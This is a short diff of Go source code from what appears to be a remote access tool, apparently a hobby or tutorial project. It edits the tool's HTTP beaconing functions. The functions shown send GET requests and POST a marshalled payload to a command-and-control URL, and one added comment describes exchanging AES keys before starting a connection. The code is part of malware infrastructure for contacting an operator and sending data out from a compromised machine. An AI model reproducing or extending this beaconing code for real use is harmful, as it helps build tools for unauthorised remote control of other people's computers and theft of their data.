@@ -94,7 +94,7 @@ HTTP Methods of beaconing out
 	- maybe others
 /*/
 
-// function to call other functions
+/*/ function to call other functions
 // I this because it's easy to undo, and it may prove
 // useful in creation of the builder scripts
 func BeaconHTTP(command_http string, method string) (herp *http.Response, derp error) {
@@ -124,7 +124,9 @@ func BeaconHTTP(command_http string, method string) (herp *http.Response, derp e
 	// apparently this is "naked"... o_O
 	return
 }
+/*/
 
+//Gets AES packet exchanging  keys, if key gets a match, initiate connection
 func BeaconHTTPGet(command_url string) (*http.Response, error) {
 	http_response, derp := http.Get(command_url)
 	if derp != nil {
@@ -134,15 +136,12 @@ func BeaconHTTPGet(command_url string) (*http.Response, error) {
 	return http_response, derp
 }
 
+// remember, this sends a payload so Core.BEACONPOSTPAYLOAD NEEDS something
 func BeaconHTTPPost(command_url string) (*http.Response, error) {
 	post_body, derp := json.Marshal(Core.BEACONPOSTPAYLOAD)
 	if derp != nil {
 		ErrorHandling.RatLogError(derp, "[-] Beacon POST payload failed to marshal, stopping beacon")
 	}
-	// but this function we are using takes bytes!
-	// so you need a line of code like THIS!!
-	// to turn text to bytes!
-	// Comment this for tutorial
 	post_body_bytes := bytes.NewBuffer(post_body)
 	http_response, derp := http.Post(command_url, "text/html", post_body_bytes)
 	if derp != nil {
